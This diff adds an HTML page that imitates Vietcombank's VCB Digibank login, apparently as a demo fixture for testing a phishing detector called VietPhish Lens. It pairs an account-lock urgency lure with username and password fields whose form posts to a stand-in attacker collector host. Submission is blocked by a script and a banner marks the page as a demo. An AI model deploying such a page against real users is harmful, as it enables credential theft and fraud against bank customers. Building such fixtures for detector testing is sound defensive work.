@@ -1,0 +1,36 @@
+<!doctype html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Vietcombank - Đăng nhập VCB Digibank</title>
+<style>
+  body{margin:0;font-family:system-ui,"Segoe UI",sans-serif;background:#eef5ee;color:#1d2b1d}
+  .demo{position:fixed;inset:auto 0 0 0;background:#111;color:#ffde59;text-align:center;font-weight:700;padding:8px;letter-spacing:.05em}
+  header{background:#0a7c3a;color:#fff;padding:14px 24px;font-size:22px;font-weight:800}
+  header small{font-weight:400;font-size:13px;opacity:.85;margin-left:8px}
+  main{max-width:380px;margin:48px auto;background:#fff;border-radius:10px;padding:28px;box-shadow:0 2px 12px rgba(0,0,0,.08)}
+  h1{font-size:20px;margin:0 0 6px}
+  p.warn{color:#b3261e;font-size:14px;margin:0 0 18px}
+  label{display:block;font-size:13px;margin:12px 0 4px}
+  input{width:100%;box-sizing:border-box;padding:10px;border:1px solid #c9d6c9;border-radius:6px;font:inherit}
+  button{margin-top:18px;width:100%;padding:12px;border:0;border-radius:6px;background:#0a7c3a;color:#fff;font-weight:700;font-size:15px}
+</style>
+</head>
+<body>
+<header>Vietcombank <small>VCB Digibank</small></header>
+<main>
+  <h1>Đăng nhập</h1>
+  <p class="warn">Tài khoản của quý khách sẽ bị tạm khóa trong 24 giờ nếu không xác thực lại thông tin.</p>
+  <form action="https://collector.example-attacker.xyz/submit" onsubmit="event.preventDefault();alert('Trang DEMO: không gửi dữ liệu đi đâu.')">
+    <label for="u">Tên đăng nhập</label>
+    <input id="u" name="username" autocomplete="username">
+    <label for="p">Mật khẩu</label>
+    <input id="p" name="password" type="password" autocomplete="current-password">
+    <button type="submit">Đăng nhập</button>
+  </form>
+</main>
+<div class="demo">TRANG DEMO – KHÔNG PHẢI TRANG THẬT – DÙNG ĐỂ KIỂM THỬ VIETPHISH LENS</div>
+</body>
+</html>
